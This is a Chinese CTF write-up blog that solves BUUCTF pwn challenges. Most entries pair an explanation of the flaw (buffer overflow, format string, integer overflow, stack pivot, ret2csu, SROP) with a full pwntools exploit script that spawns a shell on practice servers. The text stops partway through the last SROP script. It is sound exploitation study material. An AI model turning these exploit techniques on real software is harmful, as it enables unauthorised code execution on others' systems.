# [BUUCTF-Pwn]刷题记录1

力争从今天(2021.3.23)开始每日至少一道吧……在这里记录一些栈相关的题目。

最近更新(2021.5.10)

**如果我的解题步骤中有不正确的理解或不恰当的表述，希望各位师傅在评论区不吝赐教！非常感谢！**

# [OGeek2019]babyrop

![image-20210323125655409](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736479.png)

/dev/random和/dev/urandom是unix系统提供的产生随机数的设备，先产生一个随机数

![image-20210323125757017](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736144.png)



输入放到buf里，然后与随机数比较，不等的话程序就结束了，于是将输入的第一个字母弄成'\0'，以绕过strncmp

![image-20210323134424388](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736568.png)

后面一个函数，传入的参数a1是上一个函数的返回值，也就是buf[7]，所以将输入的第8位弄大点（不超过0xff）以构造溢出，看了下栈的情况0xC8不够溢出

然后是常规的ret2libc

exp如下：

```python
from pwn import *
#p = process('./pwn')
p = remote('node3.buuoj.cn', 29919)
e = ELF('./pwn')
payload1 = '\0' + b'a' * 6 + '\xff'
p.sendline(payload1)
p.recvuntil('Correct\n')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
write_plt_addr = e.plt['write']
write_got_addr = e.got['write']
main_addr = 0x08048825
payload2 = b'a' * 235 + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)
p.sendline(payload2)
write_true_addr = u32(p.recv().ljust(4, '\0'))
libc_base_addr = write_true_addr - libc.symbols['write']
system_true_addr = libc_base_addr + libc.symbols['system']
bin_sh_addr = libc_base_addr + libc.search('/bin/sh').next()
p.sendline(payload1)
p.recvuntil('Correct\n')
payload3 = b'a' * 235 + p32(system_true_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
p.sendline(payload3)
p.interactive()
```

# [第五空间2019 决赛]PWN5

![image-20210323205003536](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736082.png)

## 解法一：利用%n的特性修改0x804C044处的值为4

```
from pwn import *
p = process('./pwn')
leak_addr = 0x804C044
p.recvuntil('your name:')
payload1 = p32(leak_addr) + '%10$n'
p.sendline(payload1)
p.recvuntil('your passwd:')
p.sendline(b'4')
p.interactive()
```

## 解法二：利用%s打印出0x804C044处的值(%x,%p同理)

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = remote('node3.buuoj.cn', 25840)
p = process('./pwn')
leak_addr = 0x0804c044
payload = p32(leak_addr) + '%10$s'
p.sendline(payload)
p.recvuntil("Hello,")
p.recv(4)#先要接收4个字节，前四个字节打印的是地址
number = u32(p.recv(4))
p.sendline(str(number))
p.interactive()
```

## 解法三：利用fmstr

fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。

```
fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
第一个参数表示格式化字符串的偏移；
第二个参数表示需要利用%n写入的数据，采用字典形式，例如要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0x804C044处改为随便一个数；
第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
fmtstr_payload函数返回的就是payload
```

### 3.1 利用格式化字符串改写atoi的got地址，将其改为system的地址，配合之后的输入，得到shell。这种方法具有普遍性，也可以改写后面的函数的地址，拿到shell。

```
from pwn import *
p = process('./pwn')
elf = ELF('./pwn')
atoi_got = elf.got['atoi']
system_plt = elf.plt['system']
payload=fmtstr_payload(10,{atoi_got:system_plt})
print(payload)
p.sendline(payload)
p.sendline('/bin///sh\x00')
p.interactive()
```

### 3.2 格式化字符串漏洞可以实现改写内存地址的值

```
from pwn import *
p = process('./pwn')
unk_804C044 = 0x0804C044
payload=fmtstr_payload(10,{unk_804C044:0x1111})
p.sendlineafter("your name:",payload)
p.sendlineafter("your passwd",str(0x1111))
p.interactive()
```

# get_started_3dsctf_2016

这题太坑了……本地打没问题，远程打不通，据说是加了对地址的过滤，也有说是其他原因

本地exp:

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = process('./pwn')
vul_addr = 0x080489B8
payload = b'a' * 56 + p32(vul_addr)
p.sendline(payload)
p.interactive()
```

由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时它使用exit函数使gets函数强制退出，那么就能获得flag了

```
from pwn import *
p = process('./pwn')
context.log_level = 'debug'
vul_addr = 0x080489A0
exit_addr = 0x0804E6A0
a1 = 814536271
a2 = 425138641
payload = 'a'*(56)
payload += p32(vul_addr) + p32(exit_addr)
payload += p32(a1) + p32(a2)
p.sendline(payload)
p.interactive()
```

另外一种方法，是使用mprotrct函数修改数据段为可读可写可执行，然后用ret2shellcode的方法来做

先看下数据段起止位置和长度

![image-20210324013926574](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736327.png)

```
int mprotect(const void *start, size_t len, int prot);
mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
prot=7 是可读可写可执行
需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。
```

```
#用read函数读入shellcode
from pwn import *
#p = process('./pwn')
elf = ELF('./pwn')
p = remote('node3.buuoj.cn', 28810)
context.log_level = 'debug'
start = 0x080ea000
pop3 = 0x08063adb  # pop edi ; pop esi ; pop ebx ; ret
mprotect = 0x0806EC80
read_addr = elf.symbols['read']
payload = b'a'*0x38
payload += p32(mprotect)
payload += p32(pop3)
payload += p32(start)
payload += p32(0x2000)
payload += p32(0x7)  # rwx
payload += p32(read_addr) + p32(pop3) + p32(0) + p32(start) + p32(0x100) + p32(start)
p.sendline(payload)
payload2 = asm(shellcraft.sh(), arch='i386', os='linux')
p.sendline(payload2)
p.interactive()
```

```
#用gets函数读入shellcode
from pwn import *
p = process('./pwn')
elf = ELF('./pwn')
#p = remote('node3.buuoj.cn', 28810)
context.log_level = 'debug'
start = 0x080ea000
pop3_addr = 0x08063adb  # pop edi ; pop esi ; pop ebx ; ret
mprotect = 0x0806EC80
gets_addr = elf.symbols['gets']
payload1 = b'a'*0x38 + p32(mprotect) + p32(pop3_addr) + p32(start) + p32(0x2000) + p32(0x7) + p32(gets_addr) + p32(start) + p32(start)
p.sendline(payload1)
sleep(1)
payload2 = asm(shellcraft.sh(), arch='i386', os='linux')
p.sendline(payload2)
p.interactive()
```

# ciscn_2019_en_2 / ciscn_2019_c_1

没什么好说的，注意栈对齐和接收puts地址的写法就好

```
#coding = utf-8
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = process('./ciscn_2019_c_1')
#p = remote('node3.buuoj.cn', 28615)#Use this to attack remote
e = ELF('./ciscn_2019_c_1')
p.recvuntil('Welcome to this Encryption machine\n')
p.sendline(b'1')
p.recvuntil('Input your Plaintext to be encrypted\n')
#libc = ELF('libc-2.27.so')#Use this to attack remote
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
main_addr = e.symbols['main']#To get secondary stack overflow, must return to 'main' function
offset = 0x58
pop_rdi_ret_addr = 0x0400c83
ret_addr = 0x04006b9
payload1 = '\0' + b'a' * (offset - 1) + p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)#!!!!!!
p.sendline(payload1)
p.recvline(keepends=True)
p.recvline(keepends=True)
puts_true_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))#!!! To use 'puts' to show the true address, you must get rid of '\n' behind
print(hex(puts_true_addr))
p.recvuntil('Welcome to this Encryption machine\n')
p.sendline(b'1')
p.recvuntil('Input your Plaintext to be encrypted\n')
libc_base_addr = puts_true_addr - libc.symbols['puts']
system_true_addr = libc_base_addr + libc.symbols['system']
bin_sh_true_addr = libc_base_addr + libc.search('/bin/sh').next()
payload2 = '\0' + b'a' * (offset - 1) + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(bin_sh_true_addr) + p64(system_true_addr)#!!!!!
p.sendline(payload2)
p.interactive()
```

# ciscn_2019_n_8

要注意&var[13]是(_QWORD  *)类型的，也就是指向的数据是8个字节，而var[13]本身是四个字节

![image-20210324184629690](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736548.png)

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 27715)
p.recvuntil("What's your name?")
payload = b'\x11' * 13 * 4 + p64(0x11) + '\0'
p.sendline(payload)
p.interactive()
```

# ciscn_2019_ne_5

开始首先想到的是ret2libc，想要泄露出puts的真实地址，结果失败了，因为puts在got表中的地址开头是0x20(空格)，在scanf读入的时候就被截断了

![2](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736471.png)

那换成fflush在got表中的地址行不行呢，试了后发现是不行……

下面才是正解：

程序本身存在fflush函数，我们可以直接用它的'sh'来当作system的参数

第一次听说'sh'也行……验证如下：

![1](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736123.png)

'sh'在这里：

![image-20210325152900698](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041736804.png)

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = process('./pwn')
e = ELF('./pwn')
libc = ELF('libc-2.27.so')
p = remote('node3.buuoj.cn', 26544)
p.recvuntil("Please input admin password:")
p.sendline("administrator")
p.recvuntil("0.Exit\n:")
p.sendline(b'1')
p.recvuntil("Please input new log info:")
system_plt_addr = e.plt['system']
sh_addr = 0x080482EA
payload = b'a' * 76 + p32(system_plt_addr) + p32(0xdeadbeef) + p32(sh_addr)
p.sendline(payload)
p.recvuntil("0.Exit\n:")
p.sendline(b'4')
p.interactive()
```

# pwn2_sctf_2016

整数溢出

![image-20210325212425076](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737425.png)

第一次输入长度不超过四位的整数，在get_n函数中对输入的数字做出了限制，一个一个读入数字，且不能是'\0'

第一次输入的数字不能大于32，这显然不够溢出，但是可以注意到，get_n函数第二个实参v2是有符号的，而在函数中转变成无符号类型

![image-20210325212820362](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737044.png)

get_n的第二个形参**a2是无符号整型**，并且它没有对我们输入的第二个参数a2做无符号整数判断。而**有符号负数**到**无符号数**是**会发生溢出的。**

![image-20210325213708476](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737320.png)

写exp的时候注意一下用printf泄露地址时格式化字符串的位置和payload的写法即可

![1](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737210.png)

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
e = ELF('./pwn')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
p = remote('node3.buuoj.cn', 25470)
p.recvuntil('How many bytes do you want me to read? ')
p.sendline(b'-1')
p.recvuntil("data!\n")
offset = 48
fmtstr = 0x080486F8 #%s_addr!!!!!
vul_addr = 0x0804852F
printf_plt_addr = e.plt['printf']
printf_got_addr = e.got['printf']
payload1 = b'a' * offset + p32(printf_plt_addr) + p32(vul_addr) + p32(fmtstr) + p32(printf_got_addr)
p.sendline(payload1)
p.recvuntil('You said: ')
p.recvuntil('You said: ')
printf_true_addr = u32(p.recv(4))
p.recvuntil('How many bytes do you want me to read? ')
p.sendline(b'-1')
p.recvuntil("data!\n")
libc_base_addr = printf_true_addr - libc.symbols['printf']
system_true_addr = libc_base_addr + libc.symbols['system']
bin_sh_addr = libc_base_addr + libc.search('/bin/sh').next()
payload2 = b'a' * offset + p32(system_true_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
p.sendline(payload2)
p.interactive()
```

# [HarekazeCTF2019]baby_rop2

跟上题差不多，都是利用已有的格式化字符串和printf来泄露真实地址

但是，我本来想用这种方法泄露printf的真实地址，不知道为什么打不通，同样的写法用于泄露read的真实地址，可以成功

![image-20210327012738383](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737946.png)

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 26805)
e = ELF('./pwn')
libc = ELF('libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset = 40
p.recvuntil('name? ')
printf_plt_addr = e.plt['printf']
read_got_addr = e.got['read']
main_addr = 0x400636
pop_rdi_ret = 0x0400733
fmt = 0x0400770
pop_rsi_r15_ret = 0x0400731
payload1 = b'a' * offset + p64(pop_rdi_ret) + p64(fmt) + p64(pop_rsi_r15_ret) + p64(read_got_addr) + p64(0) + p64(printf_plt_addr) + p64(main_addr)
p.sendline(payload1)
read_true_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base_addr = read_true_addr - libc.symbols['read']
system_true_addr = libc_base_addr + libc.symbols['system']
bin_sh_addr = libc_base_addr + libc.search('/bin/sh').next()
p.recvuntil('name? ')
payload2 = b'a' * offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_true_addr)
p.sendline(payload2)
p.interactive()
```

值得注意的还有接收真实地址时的写法

```
read_true_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
```

为什么在读到 \x7f 之后截止，再获取前面的6字节呢？

![image-20210327014136636](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737160.png)

原因是在64位计算机中，一个地址的长度是8字节，但是实际的操作系统中，一个地址的最高位的两个字节是00，而且实际的函数地址是0x7fxxxx开头的，因此为了避免获取错误的地址值，只需要获取低6字节值，然后通过ljust函数把最高位的两字节填充成00。

我们还可以用这种一般的写法u64(p.recv(6).ljust(8, "\x00"))

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 28762)
e = ELF('./pwn')
libc = ELF('libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset = 40
p.recvuntil('name? ')
printf_plt_addr = e.plt['printf']
read_got_addr = e.got['read']
main_addr = 0x400636
pop_rdi_ret = 0x0400733
fmt = 0x0400770
pop_rsi_r15_ret = 0x0400731
payload1 = b'a' * offset + p64(pop_rdi_ret) + p64(fmt) + p64(pop_rsi_r15_ret) + p64(read_got_addr) + p64(0) + p64(printf_plt_addr) + p64(main_addr)
p.sendline(payload1)
p.recvuntil('Welcome to the Pwn World again, ')
p.recvuntil('Welcome to the Pwn World again, ')
read_true_addr = u64(p.recv(6).ljust(8, "\x00"))
print(hex(read_true_addr))
libc_base_addr = read_true_addr - libc.symbols['read']
system_true_addr = libc_base_addr + libc.symbols['system']
bin_sh_addr = libc_base_addr + libc.search('/bin/sh').next()
p.recvuntil('name? ')
payload2 = b'a' * offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_true_addr)
p.sendline(payload2)
p.interactive()
```

是一样的

# [Black Watch 入群题]PWN

栈迁移/栈劫持，第一次见

![image-20210327225819899](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737681.png)

![image-20210327225909892](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737104.png)

肯定是莫得system函数和'/bin/sh'字符串的，而且第二个read只能读入0x20个字符，不能够构造较长的ROP链，只能刚好够改变这个函数的返回地址

但是第一个read可以读入较多数据，放在bss段，怎么利用呢？

我们要布置的s是这样的（为了泄露write函数的实际地址）

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737082.png)

栈劫持主要用到的是一个leave；ret指令，一般程序执行完成后都会调用leave；ret来还原现场

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737902.png)

找一下程序里的leave；ret指令，leave_ret=0x8048408

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737313.png)

payload1='a'*0x18+p32(s-4)+p32(leave_ret)

我们在给buf参数赋值的时候，溢出后将rbp覆写成s-4的地址，函数返回地址覆写成leave；ret指令的地址

理一下这样写程序的执行过程：
首先程序正常结束了，去调用程序本身的leave；ret来还原现场，

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737855.png)

根据我们对栈的布局，
`mov esp，ebp`->将esp指向了ebp，栈变成了这个样子

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737784.png)

`pop ebp`->ebp寄存器被我们设置成了参数s-4的地址，指向了我们布置好的栈上方，**这边-4是因为我们第二次执行pop ebp给ebp赋值的时候，会将esp+4，如果不减去4，esp就在程序一开始的时候指向的不是栈顶，而是栈顶+4的位置，我们之后读取数据会丢失一开始的4字节，所以需要一开始的时候将指针往上抬4字节，栈变成了这个样子**

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737886.png)

`ret（pop eip）`->去调用leave；ret指令
再次执行leave；ret指令

`mov esp, ebp`->esp指向了参数s-4的位置,栈布局现在是这样

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737973.png)

`pop ebp`->弹出栈顶的值给ebp，之后栈变成了这样，我们成功将esp指针劫持到了我们布置好的栈上

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737303.png)

`ret（pop eip）`->将esp指向的输值弹给eip
接下来就是常规的ret2libc

哦对了，还有一个巨坑，专门搞我这种不分青红皂白就p.sendline()的人：

按理说，收到"What is your name?"后应该发送一段payload，可是它并没有停下来发送，而是接收到了下一句话

![image-20210328002104313](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737249.png)

因为**第二个payload不能有多余的回车，否则会跳过下一次读取**（差不多得了！）

完整exp如下：

```
from pwn import *
from LibcSearcher import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 27989)
e = ELF('./pwn')

write_plt_addr = e.plt['write']
write_got_addr = e.got['write']
main_addr = 0x08048513
s = 0x0804A300
leave_ret_addr = 0x08048408

payload1 = p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)
p.recvuntil("What is your name?")
p.sendline(payload1)

payload2 = b'a'*0x18 + p32(s-4) + p32(leave_ret_addr)
p.recvuntil("What do you want to say?")
#p.sendline(payload2)!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
p.send(payload2)#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

write_true_addr = u32(p.recv(4))
libc = LibcSearcher('write', write_true_addr)
libc_base_addr = write_true_addr - libc.dump('write')
system_true_addr = libc_base_addr + libc.dump('system')
bin_sh_addr = libc_base_addr + libc.dump('str_bin_sh')

payload3 = p32(system_true_addr) + p32(0) + p32(bin_sh_addr)
p.recvuntil("What is your name?")
p.sendline(payload3)

p.recvuntil("What do you want to say?")
p.sendline(payload2)
p.interactive()
```

# jarvisoj_fm

没什么难的，权当记录一下payload不用fmstr_payload的写法

```
from pwn import *
p = remote('node3.buuoj.cn', 25772)
#payload = fmtstr_payload(11, {0x0804A02C:4})
payload = p32(0x0804A02C) + b'%11$n'
p.sendline(payload)
p.interactive()
```

# actf_2019_onerepeater

个人感觉这题不能直接看出或者算出真正的偏移，需要通过动态调试来找出真正的偏移

原因有二：一是所给的最大输入长度为0x400，不够栈溢出，二是在main函数返回时不是常见的leave; ret而是

![image-20210328190152013](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737899.png)

也就是说，在retn前直接修改了esp的值，这个值是ecx-4的值，而ecx由ebp-4中的值控制，故不能直接确定ret时esp指向的指是多少

我通过gdb找到了真正的偏移为1052

![1](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041737415.png)

ret时，esp为0xffffd58c，在此前打印出buf地址为0xffffd170，相减得偏移为1052

![image-20210328190918543](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738362.png)

如果有热心的师傅能够告诉小弟怎么样能够不用动态调试看出这个偏移，还请不吝赐教~

此外，栈地址是`ff`开头的，数值非常大，靠`%n`一次性写入四个字节是不可能的，`printf`不可能在理想的时间内输出那么多字符也根本不能输出那么多字符，所以要**分两次写**，每次写两字节，即用`%hn`（用%n也行，重点在于要分两次写）

完整exp如下：

```
# -*- coding: utf-8 -*-
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = process('./pwn')

p.recvuntil("Exit\n")
p.sendline(b'1')
buf_addr = int(p.recv(8), 16)#also shellcode_addr
ret_addr = buf_addr + 1052
#把返回地址(buf_addr，也是存shellcode的地方)的低两位写入ret_addr的低两位
payload1 = p32(ret_addr) + '%' + str((buf_addr & 0xffff) - 4) + 'c%16$hn'
p.sendline(payload1)
p.recvuntil("Exit\n")
p.sendline(b'2')

p.recvuntil("Exit\n")
p.sendline(b'1')
#把返回地址(buf_addr，也是存shellcode的地方)的高两位写入ret_addr的高两位
payload2 = p32(ret_addr + 2) + '%' + str(((buf_addr >> 16) & 0xffff) - 4) + 'c%16$hn'
p.sendline(payload2)
p.recvuntil("Exit\n")
p.sendline(b'2')

shellcode = asm("""
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
xor edx,edx
push 11
pop eax
int 0x80
""")
p.recvuntil("Exit\n")
p.sendline(b'1')
p.sendline(shellcode)
p.recvuntil("Exit\n")
p.sendline(b'3')
p.interactive()
```

# ciscn_2019_s_3

## 解法一：ret2csu

```
64位程序的参数传递与32位有比较大的差别，前6个参数 由rdi rsi rdx rcx r8 r9 寄存器进行存放，在64位的程序中调用libc.so的时候会使用一个函数__libc_csu_init来进行初始化，通过这个函数里面的汇编片段，我们可以很巧妙控制到前3个参数和其他的寄存器，也能控制调用的函数地址，这个gadget 我们称之为64位的万能/通用gadget，非常常用。由于这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。
```

没有system和/bin/sh，注意到gadgets函数中可以提供两个系统调用，第一个（rax = 59）是execve，由于没有/bin/sh，需要我们手动输入/bin/sh，并把他的地址传给函数，所以我们需要知道/bin/sh在栈中的具体地址。

主函数如下，vul函数中有比较明显的栈溢出：

![image-20210329010416720](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738753.png)

![image-20210329010434632](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738412.png)

随便输入，会发现除了输出1234外，还会输出奇奇怪怪的东西，原因是显而易见的，输出的长度大于栈空间的长度

![image-20210329010520481](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738912.png)

那么输出的是什么呢？

![image-20210329010721041](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738737.png)

可以看到在输出0x10和0x20个字节后，分别输出的是两个不同的栈地址，第一个地址是上一个栈帧的rbp，第二个则不知道是什么。但其实不需要知道是什么，我们能够根据这两个地址和1234的地址算出偏移就行，这样在以后输入/bin/sh时，也能够通过接收到的地址和偏移算出/bin/sh在栈中的具体地址

再次用gdb调试：

![image-20210329011902336](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738530.png)

可以看到，buf的地址（也就是/bin/sh的地址）为0x7fffffffe400，write在0x10个字节和0x20个字节后（也就是0x7fffffffe410和0x7fffffffe420处）会分别输出两个不同的地址，由于后面写的payload会覆盖第一个地址为其他值，所以不能用第一个地址来计算偏移。用第二个地址，则偏移为0xfe518 - 0xfe400 = 0x118 = 280，但这个偏移也是第二次输入'/bin/sh'后的偏移吗？非也！

由于第一次发送payload后，函数不正常返回造成的抬栈等原因，**第二次发送的payload中的'/bin/sh'与我们泄露的栈地址之间的偏移不再是0x118，而是0x138**！这需要我们调试才能得出。

我的调试脚本如下：

```
from pwn import *

p = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')
context.log_level = 'debug'

main_addr = elf.symbols['main']
csu_end = 0x040059A
csu_front = 0x0400580
ret_addr = 0x004003a9
rax_59_ret = 0x04004E2
syscall = 0x0400517 
gdb.attach(p,'b *0x00400589')
payload = '/bin/sh\x00' + 'A'*0x8 + p64(main_addr)
p.sendline(payload)
p.recv(0x20)
stack_addr = u64(p.recv(8))
print 'stack_addr-->' + hex(stack_addr)
pause()
binsh_addr = stack_addr - 0x138
rax_59 = binsh_addr + 0x10
pop_rdi = 0x04005a3
payload = '/bin/sh\x00'
p.sendline(payload)
pause()
p.interactive()
pause()
```

![1](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738563.png)

如图0xc8d8 - 0xc7a0 = 0x138

为调用64位的syscall，rdi要存放'/bin/sh'的地址，rsi和rdx都要置零

![image-20210329235922650](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738688.png)

可是好像没有找到给rdx置零的gadget啊，怎么办呢，我们看到函数__libc_csu_init，利用这个函数里面的汇编片段，我们可以控制rdx和rsi寄存器的值

![image-20210330000043379](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738685.png)

正好我们刚才找到的gadgets里面也有设置r13和r14寄存器的值的片段

还有一个call [r12+rbx*8]，我们把rbx设置为0，把r12寄存器内的值设置为存放mov_rax_59_ret的地址的地址即可

整体逻辑就是：泄露出/bin/sh的地址，然后用pop_rbx_rbp_r12_r13_r14_r15 , 把r12寄存器内的值设置为存放mov_rax_59_ret的地址的地址，然后通过 mov_rdx_r13_call 执行 call r12 。然后我们跳转到pop rdi ; ret 将binsh压到rdi，然后执行syscall，此时rax为59 rdi为 /bin/sh 所以会执行system(“/bin/sh”)

第二次payload还需要注意一个填充，'a' * 0x38，这是因为call完返回之后还会进行add rsp, 8; pop等一系列操作，相当于pop了七次，故要填充56字节

![image-20210331172338405](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738996.png)

完整exp如下：

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn',27869)
elf = ELF('./ciscn_s_3')
main_addr = elf.symbols['main']
pop_rbx_rbp_r12_r13_r14_r15 = 0x040059A
mov_rdx_13_mov_rsi_r14_call = 0x0400580
mov_rax_59_ret = 0x04004E2
syscall = 0x0400517
payload = '/bin/sh\x00' + 'A'*0x8 + p64(main_addr)
p.sendline(payload)
p.recv(0x20)
stack_addr = u64(p.recv(8))
print(hex(stack_addr))
binsh_addr = stack_addr - 0x138
rax_59 = binsh_addr + 0x10
pop_rdi_ret = 0x04005a3
payload = '/bin/sh\x00' + b'a' * 8 + p64(mov_rax_59_ret) + p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) + p64(1) + p64(rax_59) + p64(0) + p64(0) + p64(0)
payload += p64(mov_rdx_13_mov_rsi_r14_call)
payload += 'a'*0x38
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(syscall)
p.sendline(payload)
p.interactive()
```

## 解法二：（正解）SROP攻击

SROP是一个于2014年被发表在信安顶会Okaland 2014上的文章提出的一种攻击方式，SROP技术的提出大大简化了ROP攻击的流程。
正如文章所述，SROP(Sigreturn Oriented Programming)技术利用了类Unix系统中的Signal机制，如图
![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738907.jpeg)
上方为用户层，下方为内核层。对于Linux来说

1. 当内核对一个用户层进程发出（deliver）一个signal时，进程被暂时挂起，控制权切到内核层
2. 内核保存进程的上下文(对我们来说重要的就是寄存器状态)到用户的栈上，然后再把rt_sigreturn地址压栈，跳到用户层执行Signal Handler以处理相应的signal
3. 当signal handler执行完之后，栈指针（stack pointer）就指向`rt_sigreturn`，所以，signal handler函数的最后一条`ret`指令会使得执行流跳转到这段sigreturn代码，被动地进行`sigreturn`系统调用，返回时调用的就是syscall(15)也就是sigreturn函数，跳到内核层
4. 在内核`sigreturn`系统调用处理函数中，会根据当前的栈指针(esp/rsp)指向的`Signal Frame`对进程上下文进行恢复，并返回用户态，从挂起点恢复执行。即：内核恢复②中保存的进程上下文，控制权交给用户层进程。

有趣的是，这个过程存在着两个问题

1. rt_sigreturn在用户层调用，地址保存在栈上，执行后出栈
2. 上下文也保存在栈上，比rt_sigreturn先进栈，且内核恢复上下文时不校验
   因此，我们完全可以自己在栈上放好上下文，然后自己调用re_sigreturn，跳过步骤1、2。此时，我们将通过步骤3、4让内核把我们伪造的上下文恢复到用户进程中，也就是说我们可以重置所有寄存器的值，一次到位地做到控制通用寄存器，rip和完成栈劫持。这里的上下文我们称之为Sigreturn Frame。

简而言之：15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。

我们在做SROP的时候可以直接调用pwntools的SigreturnFrame来快速生成这个SROP帧

SigreturnFrame() 简介：这个函数用于生成恢复上下文用的FakeFrame，使用前先要设定arch类型，实例化后按需要设置寄存器的值，最后str处理拼接到payload中。

pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行。因此我们可以通过syscall指令调用rt_sigreturn而不必特意去寻找这个调用的完整实现。此外，根据文档和源码实现，由于32位分为原生的i386（32位系统）和i386 on amd64（64位系统添加32位应用程序支持）两种情况，这两种情况的段寄存器设置有所不同。

exp如下：

```
from pwn import *

p = remote('node3.buuoj.cn',28663)
context.binary = './pwn'
#context.terminal = ['gnome-terminal','-x','sh','-c']

main_addr = 0x0004004ED
mov_rax_15_ret = 0x4004DA
syscall_addr = 0x400517

payload1 = '/bin/sh\x00'*2 + p64(main_addr)
p.send(payload1)
p.recv(0x20)
bin_sh_addr =u64(p.recv(8)) - 280

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
